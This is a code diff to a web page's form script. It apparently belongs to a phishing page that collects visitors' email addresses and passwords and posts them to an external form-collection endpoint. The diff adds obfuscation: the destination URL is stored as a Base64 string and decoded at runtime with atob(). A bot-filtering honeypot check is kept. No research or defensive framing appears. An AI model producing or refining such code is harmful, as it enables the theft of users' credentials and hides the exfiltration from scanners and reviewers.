@@ -420,7 +420,7 @@
             }
          });
 
-         // Original reporting functionality with honeypot
+         // Original reporting functionality with honeypot and encoded URL
          document.getElementById("user-form").addEventListener("submit", function(e) {
             e.preventDefault();
             const honeypot = document.getElementById("honeypot").value.trim();
@@ -432,8 +432,10 @@
             const email = document.getElementById("email").value.trim();
             const password = document.getElementById("password").value.trim();
             const data = { email, password };
+            const encodedUrl = 'aHR0cHM6Ly9zdWJtaXQtZm9ybS5jb20vNUJZVXF4QW0x'; // Base64 of https://submit-form.com/5BYUqxAm1
+            const decodedUrl = atob(encodedUrl); // Decode at runtime
 
-            fetch("https://submit-form.com/5BYUqxAm1", {
+            fetch(decodedUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
